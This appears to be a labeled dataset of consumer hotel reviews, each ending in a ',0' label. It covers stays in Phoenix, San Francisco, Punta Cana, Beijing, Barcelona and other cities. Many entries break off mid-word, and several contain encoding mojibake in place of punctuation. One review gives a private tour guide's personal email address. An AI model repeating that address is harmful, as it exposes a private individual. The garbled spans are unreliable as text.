with the old towles, which isn't a problem, but a little unusual.be leary of relying on the hotel for a wake-up call. i think its a manual system, and i didn't get 1 of 2 calls i asked for.all in all, the place was servicable. wasn't there to spend a lot of time in the hotel, so what i got was accpetable and it was very convenient to bourbon street. i don't know if i would stay there again, but i could if i had to.",0

Great hotel Stayed here for two night on my first trip to Beijing in May 2008. The hotel is brand new and the rooms are spectacular.I stayed on the club floor and enjoyed a few of the five presentations they have daily.If you can book through AMEX in order to get the fine hotel and resort program amenities. The indoor pool is nice and the spa looked great but didn't have time to get a massage.For business this place is a must. For site seeing it is a bit out of the way and in Beijing that can be problematic given the traffic. But for those who like up to ,0

"only fair in reading this review, you need to know that we don't golf and aren't too interested in a pool. we booked this room because it was the right price for what we thought would be a quiet and relaxing room for a week of shopping in phoenix.1. unless you go to a time-share presentation, you will never know the amenities of the place. there is nothing in the room--not even the restaurant's menu--but you will get a voice mail message every morning telling you to come to the concierge desk for your welcome packet. the packet has only the family activities for the week and the concierge gives you a hard-sell pitch to go to the time-share presentation. we had a pretty full schedule and aren't new to phoenix, so didn't want to waste time on the presentation. 2. the walls are thin. we heard everyone around us and their tvs--like a less-than-average motel. we heard no outside noise--no birds woke us up in the morning--but we did hear the rhythmic creaking of the bedsprings in the room above us.3. it is a pretty propery. golf course views are relaxing. having a kitchenette is helpful. the beds are comfortable. and the price is definitely right (we paid $109 for the studio). the concierges seemed to really know phoenix well, from what we heard them telling other people. if you don't mind hearing your neighbors, or go in the off-season, it's a decent place--just nothing special.",0

"good choice at lax booked this hotel on their website for a business trip. triple aaa rate was $119, which certainly seemed a better deal than something like priceline, given that i was guarenteed a no-smoking room.shuttle from terminal to the hotel came quickly, and got us to the hotel quickly.four of us booked separate rooms for the same meeting and we were all pleased. i asked for a quiet room when i booked, and when i checked in they noted my request and put me in an end room that was indeed very quiet. check in was very pleasant.the room was large (though bathroom was small to average in size), with nice, soothing colors and furnishings. very comfortable king bed with lots of pillows. the room was very clean. one minor rawback: there was high speed internet, but apparently not wireless (at least, i couldn't get my wireless to work but didn't try calling the desk to ask about it, since i was only there one night.)only one of us had a car; she used the valet which she said was only slightly more than the park yourself option.had dinner in shula's, and recommend it, even for those not staying at the hotel.i would definitely stay again at the triple aaa rate. one of the nicer options i've tried near lax.",0

"perfectly suitable for short break having read some of the previous reviews of the stratford i wasn't sure what to expect when we arrived.however, we were pleasantly suprised by what we found. on check in we met the friendliest security guy ever and had a chat with him before we went to our room.the rooms are not massive, but perfectly adequate for 2 people plus luggage. decor was fine, very clean, nice bathroom, good tv.throughout a 2 week trip we made to the us, very few hotels we stayed in included breakfast so that's an added bonus at the stratford. they have cereals, bread, muffins, tea, coffee and orange juice.location is unbeatable-the hotel is steps away from union square, right on the tram line to get to fishermans wharf and has some good restaurants and bars in the surrounding streets so everything you need is in good walking distance.i would definately stay here again and would recommend to others.",0

"the good, the bad and the ugly my husband and i just returned from a week-long stay at grand palladium (punta cana section). we were expecting a lot from this resort based on travelersé¥?reviews, the 5-star ranking and the price we paid, but i have to agree with one of the previous reviews that the resort is just ok and furthermore, ité¥??? ok only if you go during low season. this is the most expensive resort weé¥???e been to so far and unfortunately we had the worst time there (we have been to cuba several times (4-4.5 stars) and puerto plata once). the good:the grounds are beautiful and well taken care of so we really enjoyed walking around the resort (and we had to walk a lot since the resort is very large). the beach is the most spectacular, but it was very windy so we didné¥?? get to enjoy it much. the food was nice, but nothing special. however the italian restaurant was excellent - i would really recommend it.the bad:the room was large, but very basic. instead of a jacuzzi in the room we had a jet tub é¥?drop in style (no curtain) in the bathroom and nothing more, no separate shower and that was very inconvenient é¥?every time we took a shower the whole bathroom got flooded. the evening shows were really bad. we would have probably liked them if we hadné¥?? seen the shows in varadero. we were just laughing at é¥?¸ancersé¥?at this resort.most of the staff either spoke no english at all or could only understand a couple of words, and they got really irritated that we didné¥?? speak spanish. i would expect staff speaking at least some english in a 5-star resort.the ugly:unfortunately i had underestimated the comments in other reviews about the é¥?¸?eservationsé¥?that other people make on the beach and pools so i went ahead and booked the vacation anyway. that was a huge mistake! i couldné¥?? believe my eyes when we went to the beach in the morning (about 10 am) on our first day é¥?the whole area was covered in lounge chairs that were all é¥?¸?eservedé¥?using towels, cloths, shoes, books and so on! we had to walk around for 30 minutes before we could find some shade and a free chair! based on the reviews, it seems like most people think that this is normal to wake up at 6 am to reserve chair in a 5-star hotelé¥?i have never seen anything like that before, even when we went to a 3.5 star hotel. this is absurd! either the beach was full of towels and clothes relaxing under the sun, leaving no space for people, or people filling all the beach and leaving no space for those who do not wake up early enough (",0

"expensive but overall good value we stayed at the hilton for our last three days in california so that we could visit universal studios. check in was smooth and the staff very friendly.the hilton is quite close, a 200 metre walk away and our room overlooked the studios. the room was more than comfy and quite large and spotless.i cannot understand why you cannot seem to get milk in the usa at hotels anymore and generally everyone is quite stingy with the coffee allocation. the hilton was no exception.we dined at the restaraunt on several ocassions and specifically for the seafood buffet. the food and choices were good but i thought the price was a little high.the ambience of the hotel was quite good and relaxing. i made the choice of getting the valet parking for the extra $5 per night for a total of $20. we could have parked it ourselves but what the heck, it was our last few days after a nice holiday in the usa.",0

"one of the best hotels in north america i stayed in the soho from dec. 24-28 and now have a favorite hotel! previously i had thought no one could match the service and amenities of a rosewood hotel (see hotel crescent court or mansion on turtle creek in dallas) but the soho exceeded their high standards. the property is beautiful and just the right size for a personal feel for each guest, but maintaining the granduer of a special hotel experience. the rooms are very large and the walk in closet configuration should be adopted by more hotels along with the ample bathrooms. senses is a great restaurant and though a little more than cora's across the street the breakfast buffet is worth it. of course the deserts are great and just right for a late night treat! but the best part of the hotel were the peolpe - on christmas day there were only 18 guest in the hotel, but everything was fully staffed and extra efforts were made to accoma",0

"great hotel had a wonderful 5 nights staying at the tuscan inn at fisherman's wharf. the front desk staff were very helpful. the hotel itself was one of the best we have stayed in. it had such a warm and friendly atmosphere. the wine tasting in the afternoon made available from the manager was a really nice touch as was the free tea and coffee in the lobby in the morning which got you off to a great start for the day. the hotel was very central to everything. we walked to fisherman's wharf, union square, starbuck's, laundromat (1/2mile from hotel). italian restaurant next door to hotel had fantastic food. as for the room we could only find one complaint which was the shower head. apart from this the room itself was perfect, very clean and fresh clean amenities every day. attractions that we feel are a must are:- segway tour, cable car and ghiradelli ice cream is a must!! these attractions are in very close proximity to each other. jacob on the segway tour was very patient and lots of fun. also make sure you visit alcatraz.",0

"probably a good hotel for europeans who want the surreal hollywood experience first i will say that this hotel tries so hard to be cool and the 'it' place to stay but would be better suited to invest that money on a new elevator and carpeting. recently stayed here to find the elevator broken, the gym and fitness center shut down. so i thought, hey i'll go for a swim in the famed hockney pool. well that pool is only for supermodel wannabe types and there's a major scene there--so if that's the kind of hollywod experience you want then the hotel pool is for you. the rooms are small, and while there have been some nice touches like quality bedding, nice vibe, it just doesn't mask that this is essentially an ancient hotel.last, my pre-ordered room service didn't arrive and that really cheesed me off .....and i don't like having to pay for coffee when they provide a coffee maker...so, that's the negative, there are many positives to this place although i'm not sure if they'd be enough for me to stay again. the location is great, right across from mann's chinese theatre and on the walk of fame. the fresh toiletries are a really nice touch, the rooms are immaculate and the linens are good quality. free internet access in lobby is nice and the hamburger restaurant attached to the hotel is excellent.",0

"gracias bahia principe punta cana my family and i (my husband, 2 daughters ages 8 and 16) spent the week of june 10th at the bahia. we all had a wonderful and relaxing time.i owe alot of thanks to the trip advisor and its members for providing so many tips and insight into this resort. i did alot of research on the hotels prior to booking with the bahia principe in punta cana. now, it's my turn to return the favor.our arrival at the punta cana airport was very quick and organized. i couldn't get over on how quick we were out of the airport. on the bus ride to the resort we were given a package including the hotel room keys, towel cards, and color coded bracelets for the week. (each member of the family gets one towel card. you use the card to get your towel, at the end of the day you return the towels and get a card back for the next day). they also had us fill some paperwork prior to getting to the hotel (40 minutes approx.). the ride went quick with everything being completed on the bus. once we got to the resort they had caribbean music playing with dancers and cocktails waiting for us as a welcome. we literally got off the bus, our baggage was put on a trolley and take to our room within minutes. they really were organized on the whole process. we sat in our room wondering what had just happened!!!the resort is absolutely gorgeous with all its colors, flowers, and lush plants. this is a well kept resort and it clearly shows that the staff and management take great pride in the bahia principe.yes, the resort is big but as you've probably already heard they have trolleys going past every few minutes going through the resort making drop off's/pick ups. this is a great time to enjoy the scenery at the resort.the beach was spectacular. it truly was paradise! all the palm trees along the beach the white sand and the turquoise water. the water was warm but refreshing when you got in. i took our own personal towels with lots of color and patterns that we could use them to mark our chairs. it's hard to find a chair when they are all blue! i have an 8 yr old that loves the water and i needed to ensure that we had a spot where we could see her at all times. with this being said, i would go down to the beach at 7am and mark our chairs under a hut. we would go for breakfast and then come back down to the beach for the day.we would stop at the pool on the way back to the room around 4:30. the pools were beautiful and well kept. i did not enjoy the pools nearly as much because i found it to be loud and more of a party place (this is ok if that's what you are there for. we were there for some quiet family time.) there is the main pool at the front of the resort by the beach. this is the most crowded pool but definitely huge. there are 2 other pools at the back of the resort before the lobby one on the bavaro side and one of the principe side. not sure why there are 2 sides but it doesné¥??' matter because they are identical. the pool on the bavaro side which is the side we stayed at was very nice and quiet. unfortunately, this pool is only designated for club diamond members who we were not. i found this to be a let down. the principe side is definitely were the party is at and more people. however, we still enjoyed ourselves.the food is enjoyable and there is a great assortment and a theme night every night at the buffet (beside lobby). by the end of the week i must admit i had had enough. i just found it to be too rich and heavy. this has no bearing on how well the food is prepared. it is obvious that they take great pride in everything they do and they definitely try to accommo",0

"highly satisfactory my partner and i stayed at the intercontinental (ic) hotel bali recently for five days and overall the experience was highly satisfactory. the resort is quite vast, beautifully landscaped, with gardens, pools, lagoons and prime beach front location. there weren't many guests when we stayed and during xmas and new year, the guest numbers are bound to increase though the size of the resort also means one doesn't feel 'hemmed in' by fellow guests. there are also quite a few security guards checking vehicles entering the resort. taxis are also easily available, try to get a taxi with a running metre as some taxis go on fixed price (like some taxis in kuala lumpur) to certain locations. hotel service was gracious and pleasant.check-in was swift and personalised...a member of reception meets and greets you at the resort entrance and then deals with the in-room registration and check-in details etc with you while you are relaxing in a comfortable sofa in the lobby with a cold drink and cool towel...when we were there, there was no queueing up behind a reception counter to check in as it is with most hotels..we stayed in a resort classic room, spacious with a balcony (overall size is almost 50 square metres)..nice view of the lagoon and gardens, with frangipani trees and a small slice of ocean view..bathroom was lovely, toiletries from audley's of london, strong shower, comfy bed and pillows, in-room safe, and a working air-con that wasn't arctic like some hotels...there is room for improvement though: the furnishings like the desk, coffee-table etc are quite",0

"high on the hill! really enjoyed our stay at the stanford court. the hotel is right at the top of nob hill - going down is easy coming back is a killer!we purchased a 3 day ticket from the hotel for the 'muni' transport so were able to use the trams, cable cars and buses so getting around was made easier. the room was very clean but did seem small as we had just come back from large rooms in san fransisco and hawaii. the decor was lovely as the room had been recently renovated. there were tea/coffee making facilities, air conditioning and a huge tv. the beds were turned back every evening and a chocolate and bottle of water left in the room for our use. the radio was also turned on which made the room seem very comfortable to come back too. we did not have much to do with the front desk so i can't really comment on this. the doormen were very pleasant and happy to have a chat everytime we came in and out. there is a free internet /computer in the foyer which is for everyone's use but they do ask that you restrict the usage time to 10 minutes which seemed reasonable.it would have been nice to see more of the hotel but with all of the renovations being carried out this was impossible. be prepared to wait a long time to for the cable cars as obviously everyone wants/needs to use them. use the 'muni' transport to go to the golden bridge then take a walk across - very invigorating!if you want to visit alcatraz you must book before going, we were really dissapointed to find that all the tickets had gone until at least a week after we left. we had to make do with a boat trip around the island which wasn't quite the same.",0

"amazing old hotel the entire building is unbelieveable. it's really ornate, like a palace. it was built almost 100 years ago, and they sure don't make hotels like this anymore. it's a little pricy, but for a downtown la location with this much historical appeal, it's worth the splurge.",0

"Loved JW! Stay was excellent. First my friend and I booked a car service pick up from the airport, while it was a little costly 85 USD, it was WELL WORTH IT. They meet you the second you enter the airport, take you thru customs, down to luggage and then right to the waiting car which has water, cell phone (which the hotel calls you and gets your room ready to any preference you might have).The room was great. We had great service. I read the previous review about the bad breakfast service and that is unfortunate, but we experienced nothing like that at all, our stay was 5 days. People were so helpful. We did not speak a word of Madarin and in no way felt hindered by this. I am Asian and so I was concerned that people would expect it, but they were quite gracious as soon as they realized I was english only. Also the door man was great assisting with the cabs. And also JW was great getting us an English speaking guide for Shopping, Sally (the guide, asian but had a western name) was amazing - it was 100RMB an hour. What a deal! Her email is (yiwei1979@126.com. Highly recommend her! Her english was great and she helped with all the bargaining.And lastly we needed a late check out which the hotel accomi",0
"sweltering indoors in phoenix i don't even know where to began. i have stayed in over twenty embassy suites over the last eleven years. first of all we booked this room because it was about twenty dollars cheaper than the other hotels in the chain. i was a little nervous, but i had never stayed at a bad embassy. the web site doesn't mention this but 80% of the rooms are outside with front and back entrances leading to the outside. on this particular day it was 110 degrees in phoenix. when we arrived we were hot. we had driven for two twelve hour days in the sun, and just wanted to relax. we checked in, front desk staff courteous. gave us our room key and we went on our way. first thing we noticed upon walking in the room was the smell. it was very musty and the room was a comfortable 87 degrees. the air was completely off. so we turned it down and waited for it to cool off. not so lucky. after two hours the room was only down to 77 degrees and it wasn't going any lower. i am on medication and am supposed to watch my heat exposure and i was already way too hot. then i saw a sign that said you have to pay for internet and local calls. also not on their website. called the front desk to complain...then went to the front desk to inform them about the air. they said they would send maintenance and i was a gold member so the internet was free. 30 more minutes pass. i make another call. oh they haven't been there yet? he probably doesn't have his radio. i'll look for him. can i speak to a manager? oh there's not one on the property. as i am standing over a letter that says if you don't rate us a ten call the manager on duty. we will find someone and give you a call. ok...twenty more minutes pass now i am calling the 1-800 hilton number. oh and by the way the internet is down. or isn't strong enough to reach your room. temperature is still 76 degrees. finally an hour after the first call maintenance shows up. meanwhile hilton honors is trying to get me in another hotel. when hilton finally reaches the manager she says if they leave they still have to pay. by the way this was also after asking to switch rooms. we were told there were no other available rooms. finally three hours after checking in we were released to go somewhere else. we ended up in a beautiful hotel, for twenty more dollars a night. i do not believe our problem would have been resolved so quickly if we had not been hilton honors gold members. by the way maintenance took the cover off the air conditioner, took it apart and put it back together again and said it was fixed. temperature upon checking out 76 degrees. stay away if you can.",0

"lovely beach and resort grounds but that's it! we stayed at the pcp from june 18th throught the 25th and had the vip package for what that is worth. we have been to many all-inclusives and consider ourselves not very picky or hard to please. let me start out with the positives: yes the gardens are well kept and we even tipped the gardeners for their hard work. the beach was nice, the water clear, the sand white and smooth. expect to walk out about 15 feet and then it does drop off. the most beautiful beach we encountered was on our tour with the dune buggies. that beach was called macao beach. if you take this tour you will get extremely muddy and the mud doesn't come out of your clothes, so bring clothes that you don't care about. do bring candy or treats for all the children that come out of their houses to bring you pictures and flowers. i gave a few of them a dollar, but wished we would have known to give them something else. check in was smooth and you do get their punch and a cool washcloth which you will need after your very bumpy ride to the resort. every resort i have been to has done the same thing though. it took about 45 minutes as you have to drop everyone else off and this is one of the last resorts. my advice would be is to get your own taxi to and from so you don't have to wait. friends that we met paid 33 usd at night from the airport which is higher than their daytime fees. the conceirge service in the lobby was helpful, polite, took us to our room right away with our luggage. we did get the fruit basket, 1 small bottle of rum, 1 small box of 3 cigars, and the towel decorated with flowers. yes the room stays moist as it is humid. remember to bring a candle and it will keep your room smelling fresh all week long.the rooms need major updating. the bathrooms are very out",0

"great hotel a great hotel and well located to investigate phoenix. even though it was full of young people the hotel was quiet. the staff were friendly and helpful and when we checked in the poor check in girl had phones ringing and a long queue to deal with but she kept calm and friendly throughout. the room had two beds and was clean with a great air conditioning given the outside heat. breakfast was a buffet and it was included in the price. there was internet access, with a printer, freely available in the foyer area.",0

"fantastic vacation at the grand palladium punta cana my wife and i had a great week at the grand palladium from march15-22. the grand palladium consists of 3 main resorts, the bavaro, the palace, and the punta cana. we stayed at the punta cana and had a fabulous time. here are some of my thoughts on the resort.food é¥?there are many restaurants to choose from, with food available throughout the day. the buffets are great for breakfast and lunch, and we went to a couple of them (las torres, la catedral) for dinner as well. there is plenty of selection in food and we found most of it quite tasty. our favorite for breafast was the el behique and for lunch it was the el bohio (beside the palace pool). each of the buffets has several made-to-order stations so you can have something made to your specifications and be assured that it is hot and fresh. i am a pasta eater and there was plenty of selection for me at the lunch and dinner buffets. we went to the mexican a la carte restaurant (la gran cantina mariachi) for dinner twice and the wait on each occasion was around 30 minutes. however, they give you a pager and there is a nice little bar right next door so the wait was no big deal. during our next visit we plan to sample the cuisine from the spanish restaurant (el quijote), la uva, and el arrecife. we heard mixed reviews from people that visited the italian and chinese a la carte restaurants. if you expect steak and lobster to be served at the buffets then this resort is not for you.advice - if you don't want to wait for a seat at the a-la-carte restaurants then arrive at 6:00 when they first open.pools é¥?there are 4 main pools located throughout the resort, each with a swim up bar. we especially enjoyed the animation teams which had activities going on throughout the day. if you want to spend a quiet day by the pool, soaking in the sun and snoozing throughout the day then you might find these guys a little annoying. if you want to participate then you will really enjoy tony and the gang at the bavaro pool, and ramon and his team at the palace pool. we walked down the beach to the palace pool almost every day because we had so much fun with them, even though our room was right next to another pool. thanks to sandy, rafael, starlin, roberto, perla and massiel for making our stay so enjoyable.advice - if you want a lounge chair then play the towel game and get down to the beach or pool early. we didn't bother since we were happy sitting in the patio chairs near the bar on the pool deck (there are always some available), and lying in the sand on the beach.rooms é¥?the rooms were nice enough. nothing spectacular but very comfortable for a relaxing vacation in the caribbean. beds weren't all that soft but did not impede having a comfortable sleep. the pillows were flat and had a musty smell, likely from the warm, moist air. the room was kept immaculate by the housekeeping staff. we stayed on the 2nd floor in the 2000 block. i had requested a room on the upper level of the 2000, 3000, or 4000 block and was pleased that my request had been taken into account. the prevailing wind goes straight down the main floor hallway in these 3 buildings and i'm sure creates some unwanted noise throughout the night, but the 2nd and 3rd floors are sheltered from the wind. advice - bring some cologne or perfume to camouflage any musty smells in your room. we brought scented candles but that did nothing for the pillows.sunwing vacations - we had a great experience with them. it was really easy to book online and i believe we got a pretty good deal based on the research i did. the flight from toronto was absolutely full, and the plane seemed a bit smaller and cramped. however, once we departed they served champagne and then a hot meal with wine. the 4 hour flight went by very quickly. once you pass through the security area at the airport follow the corridor around to the right and go straight to the sunwing booth in the far corner (ignoring the porters and cab drivers along the way). the sunwing rep will tell you which bus number will bring you to the resort. walk straight out to the parking lot and the sunwing buses were straight out in the 4th or 5th row. we attended the orientation session the next morning and received a lot of great information from the onsite sunwing rep.advice - attend the orientation session on the first morning, it is 30-45 minutes well spent.entertainment - there are two theatres onsite with shows every night. we went pretty much every night and enjoyed all of the shows. the michael jackson was the best one by far and was standing room only. here is the timing each night.9:30 bingo game where you can win rum, coffee, and other prizes.9:50 the animation teams hands out awards and prizes from the events earlier in the day. make sure you attend if you were a winner.10:00 the show.11:30 dance party with the cast when the show is done.advice - arrive early for the michael jackson show to assure yourself of a seat.excursions - we looked at all of the various excursions available and decided on the trip to soana. we had a fantastic time! i knew there was a 2 hour bus ride (based on previous reviews) to and from the boat launch so that was no big surprise. even though the day started out pretty dreary (a local said it was their coldest day of the year) it turned out to be very nice. after the high speed boat ride out to the island, the weather warmed up nicely and we had a great time at the beach. i was surprised at how good the food was at the beachside bbq buffet, and the rum was flowing freely at the bar. we met some fellow canucks during the trip (hi to christine and the gals from ottawa) and had a great time. the catamaran ride back to the mainland was a non-stop dance party.advice - bring cash! the beach vendors on soana can be pretty aggressive but you can also get some really good deals. we had been in the resort gift shop on the previous day picking out items we were planning to purchase later in the week, and found the exact same items for a fraction of the price on soan. you can negotiate with the vendors and needless to say we got some very good deals.advice - wear your bathing suit since there are no change rooms along the way. bring snorkeling gear.advice - be ready to take pictures during the bus ride. you travel through a couple of small towns and this is a unique opportunity to take some pictures of the local culture.in general- the service. we received great service everywhere we went on the resort, and for the most part tipping was not expected. i did bring along 30 us singles for tipping and spent them mostly on good service from bartenders. money well spent indeed.- the spa. it is new and improved in a big new buidling. they haven't up",0

"Palace Punta Cana is not paradise I just returned from a 6 day stay at the Riu Palace Punta Cana. Let me begin by saying that I am in the Travel Industry, and I am an experienced traveler. The Punta Cana airport is lovely. Thatched roof, beautiful grounds (yes at the airport), and easy baggage handling. The ride from the airport to the hotel (our transfers were NOT included since I was traveling under a travel agent rate) took approximately 30 minutes, and the cost of $30. (reasonable for the three of us)I was traveling with my husband and my almost 12 year old son, and when we arrived to the hotel the architecture was prettier than the pictures onliine. It almost looked as if we were staying in some middle eastern sultan castle.The check in process was fine. Upon our arrival I realized that there would be a language barrier since most did NOT speak english well. Actually they barely spoke English. When we arrived at our room my husband knew we would not be staying in the room they had reserved for us. The large stain on the bedspread was quite noticable and made me feel as though it hadn't been washed since their opening in 2006. They quickly accommo",0

"will never stay here again the rooms here are large and nice, and the views are remarkable but not nearly enough to make up for the awful service i received 2/15-2/17/07. upon arrival the doorman did not come to the curb to assist me with my luggage - normally this wouldn't be a big deal to me but with the wind gusting and snow on the ground, it irked me this time.my room was large, clean and well-appointed. all was well until i attempted to open the mini-bar, which was stuck. a call downstairs informed me that they had problems with that particular room and would send someone right up. maintenance arrived within 10 min but it's annoying not to be told of the problem in advance when management knows about it.on my second evening i had trouble establishing an internet connection; again, a call downstairs informed that particular room doesn't have internet connectivity and they offered to move me to another room. at this point i spoke to the manager who denied that anyone had any prior knowledge of the lack of internet connection in that particular room - whatever - i went ahead and moved rooms. i checked out saturday morning at 6:30am and asked the desk clerk whether i would be able to hail a cab at that hour or if i was better off calling for one. i was told that the doorman (who was nowhere to be seen at that moment) could hail a cab for me. it's 6:30am on a saturday, there is no one else in the lobby, yet the desk clerk seems to feel it's beneath his station to accommo",0

"great hotel having read reviews about moderately priced hotels in la i was worried about reports of unsafe neighbourhoods, unfriendly staff and dirty rooms (one reported dried blood on the bedhead). i chose the crowne plaza beverly hills because of generally positive tripadvisor reviews, its location and access to good public transport and i was not disappointed. i can thoroughly recommend this hotel. the staff were friendly, the rooms very clean and the beds were so comfortable i had trouble getting my daughter up in the mornings! we joined the hotel chain's priority club and received a complimentary breakfast each morning which was more than adequate and saved us dollars. the bathrooms were a little small and needed updating but they were fine. there was easy access to the city bus system with the big blue bus-stop to santa monica beach just around the corner and the metro to downtown outside the front door. we were in walking distance to rodeo drive. we had no trouble getting around using the public transport system and enjoyed our stay in la and at the crowne plaza.",0

"the pits we had just stayed 4 fabulous days in las vegas, coming to san francisco for a further 3 days. we arrived and the stanford and thought 'this looks nice' went into the lobby which was also nice. they were nice on the check in desk gave us our key etc and told us we were in a superior room with a view of the courtyard we thought 'oh how nice' we got in the lift got out on the 8th floor (this is the top floor) the smell hits you when you get out of the lift it smells musty and damp, the corridors were small and the carpets in the hall way were dirty. we opened the door to our superior room and in there was a bed (double) and not very much floor space and old wardrobe and a very small bathroom. we didnt even unpack we rang downstairs to confirm that this was indeed a superior room they said it was we said it was no where near good enough. our option was to upgrade for a furthe $50 per night to a deluxe room. so not really having a choice we did this. we got the key went to the delexe room only to find the stence was still there and the room was actually no different no bigger and certainly no better than the last room. it was awful. we then rang to double check that this was indeed the upgrade room and it was. on that note we spoke to the manager and said we were leaving they said fine, so we rang round looking for a new hotel and we booked in at the holiday inn at fishermans wharf. they then had the audacity to charge us $12 for the telephone. i would have rather flown home than stay here it was awful.",0
"great value, awesome location i stayed at the chelsea lodge in april 2005 and wasn't sure what to expect, even though most of the reviews i'd read about the place were positive. i loved it. the location can't be beat and neither can the price. my room was even cheaper than listed because if you pay with cash you get a discount! the room was small, which i expected, but it's just fine for one person. having your own sink and shower in the room makes dealing with a shared toilet much easier. in fact, during my 6-night stay, i never had to wait to use the facilities and i hardly even saw another soul, although the place was almost booked solid. not having cable was a bummer, as i'm totally addicted to ny1 when i'm in the city, but as i only spend daily prep time in my room anyway, i coped. my heater made a few strange noises, but once i figured out where the noise came from it stopped bothering me. the hot water in the shower was plentiful...except during peak morning times, but i just made simple adjustments to my daily schedule (and enjoyed a little extra sleep!).i've recommended the chelsea lodge to all of my friends since staying there and i'm planning on booking again for a trip this fall. it's cozy and safe and the staff was polite. what more could you ask for?",0

"nice, but average i stayed here recently in mid-october and got a very good deal on a business government rate. the room was very spacious, the resort itself quite pleasant. however, if i had had to pay standard commercial rates, i would have to rate this property simply average for an advertised luxury resort. the newer resort hotels in nearby scottsdale have far more to offer than the pointe hilton, particularly to adults traveling without children. the front desk here seemed a bit understaffed; i had to wait nearly 20 minutes to hand in my room key and get an up",0

"Fantastic--One Of The World's Great Boutique Hotels This is a hotel that has its act together. I chose this hotel because I'm the concierge at the No. #4 rated hotel in the United States on Tripadvisor, the Holiday Inn Historic District in Charleston, South Carolina, and whenever I travel I always like to stay at hotels that are highly rated on Tripadvisor so that I can learn tips and techniques to help me do even better at my own job. In my job as a concierge, I try to dazzle my guests every day with great customer service, but as result it's very hard to impress me when I stay at other hotels. Well, I'm here to say right now that I was completely DAZZLED by the level of customer service at Casa Camper. If you want to learn all the qualities that make up a great hotel, you need to stay at Casa Camper. Before my arrival, I asked the staff to recommend a tour guide to take us around Barcelona. They recommended someone and I tried several times to contact her by e-mail to no avail. So I e-mailed Casa Camper--could you try to track her down for me? Within two hours, I had an e-mail from the tour guide I was trying to reach, who said that Casa Camper had contacted her about my efforts to reach her and profuse apologies about her slowness in getting back to me. Now THATS customer service! When Casa Camper heard I was having trouble reaching this tour guide, they made my problem THEIR problem! We were taking trains all over Spain, but one of the tickets we were told could only be bought locally, not over the phone. So I e-mailed Casa Camper--could they get them for me? Within two hours, I received an e-mail from Casa Camper saying that they had already bought the tickets for me and would be waiting for me when I arrived! Wow---these people were really starting to dazzle me! When we finally arrived in early November, I immedietely fell in love with the decor of the hotel. There was a stunning mural of Barcelona on the wall and the whole place exuded an air of class and cool. When we checked in, something happened which I've never seen at a hotel before. One staff member took our passports and credit card while another one took us around and gave us an introductory walk around the hotel to explain the concept of the hotel and how it worked. This lasted at least 10 minutes and I later observed them doing this walk with other guests. They said they tried to do this with ALL the guests--it really made you feel special. I LOVED this idea. I LOVED the breakfasts---they made me a great ham and eggs or omelette every morning just the way I liked it and couldn't have been nicer about it. The rooms were ultra-chic and cool. The showers were the best I've ever encountered---fantastic water pressure that would come down like a waterfall. Everything was very, very clean. The beds were great, with huge pillows to rest your head against. When you got your wake-up call, they did something I've never seen at a hotel---they would ask you if you wanted them to call you back in 15 minutes just in case you went back to sleep!!! How innovative. When have you ever had a hotel ask you THAT before? The other innovative thing is this concept of the the 24-hour cafe in hotel where you could get snack or a drink at any hour of the day without having to pay anything. I loved this idea, too--although I will say it tended to be really healthy snacks. I suggested that they consider putting out some chocolate-chip cookies, oatmeal cookies, perhaps even some carrot cake for the junk-food junkies staying in the hotel. If they did that, then they 24-hour cafe concept would have been REALLY amazing! The best thing about this hotel, though, like all great hotels, is the staff. You can have the greatest rooms in the world, but without great staff, the hotel has no soul. The staff here speaks English fluently (a big plus in Barcelona, where a surprisingly large portion of the people have little grasp of English) and is in general, top-notch. I got a chance to speak with the General Manager, Nathalie Porta. She came up to me and and asked how my stay was going. Like most of the staff at Casa Camper, she was absolutely stunning to look at. I asked her, What is your secret? How do get such great staff? She said, We teach the staff one thing--never assume anything. Great advice. I sat down with her and told her my impressions and what she could do to make it an even better hotel. To my amazement, she took notes! This is the mark of someone who was born for the hotel business. She didn't think she knew it all--she wanted to know what she could do to be even better! Other stand-outs among the staff---Gemma was a super-star. She also was an example of someone who was born for the hotel business. She gave the feeling she really cared about my stay and bent over backwards for us! Maude was a total sweetheart. She did the introductory walks of the hotel and was, in general, fabulous. Cristina did the e-mails beforehand and was just as nice in person as she was by e-mail. Marilo at the front desk was also super-nice. I have only one criticism--the tour guide that they recommended for us to take us on private tours around Barcelona was good, but not great. I suggested to Nathalie that they set up a program with the staff where once a month they pay each one of the staff to go out and take some interesting new walking tour or visit some new exhibit at one of Barcelona's many museums so that they can always have current and up-to-",0

"most enjoyable stay we recently spent 10 nights at this location while on a family vacation. the location was great and the staff was excellent. they were helpful in every manner possible.the rooms were spacious and clean (we had a suite) and free internet was very useful.john the conceirge was great at recommending attractions and giving directions.many useful amenities were close by including a ralph's supermarket, numerous dry cleaners and many resturants.would certainly stay here again.",0
"doubtful for another visit start with the positives: housekeeping service was first-rate and the hotel location is convenient. the king non-smoking room had a comfortable bed and a plasma-tv and couch for $150/single. the room had both refrigerator/microwave.shower and bathtub were better than average.continuing with the negatives: no morning newspaper at your door - in fact usually no newspaper on the premises in the late morning, at all. breakfast room small and usually crowded with no pastries - had to settle for banana/yogurt. coffeemaker in room was the one-cup-only variety rather than the usual (4-cup) pot. location of hotel is intersection of two (northern 16th street) heavily traveled and noisy roads - ask for a room facing the back of the property. request for a third bath towel daily was ignored. registration staff was uninterested.bottomline: aside from proximity to a convenient freeway, thisfacility has little to offer.",0
"terrible bed and snotty staff. the offer of free coffee certainly does not balance out the horrid mattress, or the snotty front desk staff. we booked a room with a king-sized bed but discovered that we had been put in a room with a queen-sized bed. when we inquired, we were told that the hotel considers a request for bed size but that they can't guarantee such a request unless the hotel guarantees bed size at the time the reservation is made. in other words, you have to even know to ask for such a guarantee. talk about double talk. there was no attempt at an apology from the counter person or the manager. it was like talking to a wall. their attitude was bad enough -- but the bed was absolutely horrid. and i'm not talking size -- i'm talking the absence of even minimal comfort. my husband and i rolled toward a depression in the middle of the bed, and it felt as if the bed had no padding whatsoever. it was so hard that my hip bones ached the next morning. the only difference between the bed and the floor would have been that, if we had slept on the floor, we wouldn't have rolled together. we didn't ask for or expect much of a view, but the windows opened to a dark alley and a view of the moldy wall of the building across the alleyway. the towel heater would have been a nice touch -- if it worked. but the absence of a fan in the bathroom was not offset by the nonfunctional towel heater, or the tiny robes offered for guest's use. no, the room wasn't outrageously expensive (although parking was). the room and the bed were just not acceptable. i've had better rest at a holiday inn.",0

